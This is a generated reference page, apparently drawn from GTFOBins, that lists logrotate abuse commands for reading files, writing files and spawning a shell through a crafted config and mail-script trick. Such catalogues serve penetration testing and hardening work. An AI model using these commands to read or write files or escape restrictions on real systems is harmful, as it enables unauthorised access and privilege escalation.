---
parsed_by: focuslocust
source: commands
type: generated
---
# logrotate Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## logrotate

Tool page: [logrotate](../../tools/linux/logrotate.md)

### file-read

```text
logrotate /path/to/input-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/logrotate` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
logrotate -l /path/to/output-file DATA
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/logrotate` |
| Evidence | Function example preserved from source parser. |

### shell

```text
echo -e '/path/to/temp-file.config {\nmail x@x.x\n}' >/path/to/temp-file.config
echo '/bin/sh 0<&2 1>&2' >/path/to/temp-file.sh
logrotate -m /path/to/temp-file.sh -f /path/to/temp-file
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/logrotate` |
| Evidence | Function example preserved from source parser. |
